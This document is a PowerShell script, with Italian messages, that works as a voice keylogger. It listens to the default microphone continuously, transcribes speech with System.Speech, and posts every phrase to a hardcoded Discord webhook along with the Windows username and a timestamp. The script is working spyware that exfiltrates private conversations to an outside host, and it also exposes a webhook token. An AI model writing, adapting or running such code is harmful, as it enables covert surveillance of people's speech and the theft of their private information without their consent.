function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$false)]
        [string]$text
    )

    # Webhook Discord
    $dc = 'https://discord.com/api/webhooks/1370038152143831101/iN2bRBDfDdvTBDEk0ElyeUlObFuw8zmflue_XbZkaTYUL8rH87ZYvwozegioJSkj-um2'

    if (-not [string]::IsNullOrWhiteSpace($text)) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $username = $env:USERNAME

        $body = @{
            username = "VoiceLogger"
            content = "**üó£ Nuova frase registrata**`nüë§ Utente: $username`nüïí Ora: $timestamp`nüìÑ Testo: $text"
        } | ConvertTo-Json -Depth 3

        try {
            Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json'
            Write-Host "‚úÖ Inviato a Discord"
        } catch {
            Write-Host "‚ùå Errore durante l'invio a Discord: $_"
        }
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    Write-Host "üé§ VoiceLogger attivo. Pronuncia qualcosa..."

    while ($true) {
        try {
            $result = $recognizer.Recognize()
            if ($result -and $result.Text.Trim().Length -gt 0) {
                $text = $result.Text
                Write-Host "üìù Testo riconosciuto: $text"

                # Invia a Discord
                DC-Upload $text

                # Esegui comandi vocali speciali
                switch -regex ($text.ToLower()) {
                    '\bnote\b' { Start-Process notepad }
                    '\bexit\b' { break }
                }
            }
        } catch {
            Write-Host "‚ö†Ô∏è Errore nel riconoscimento vocale: $_"
        }

        Start-Sleep -Milliseconds 500  # Leggero delay per evitare spam del loop
    }

    Write-Host "üõë VoiceLogger terminato."
}
voiceLogger
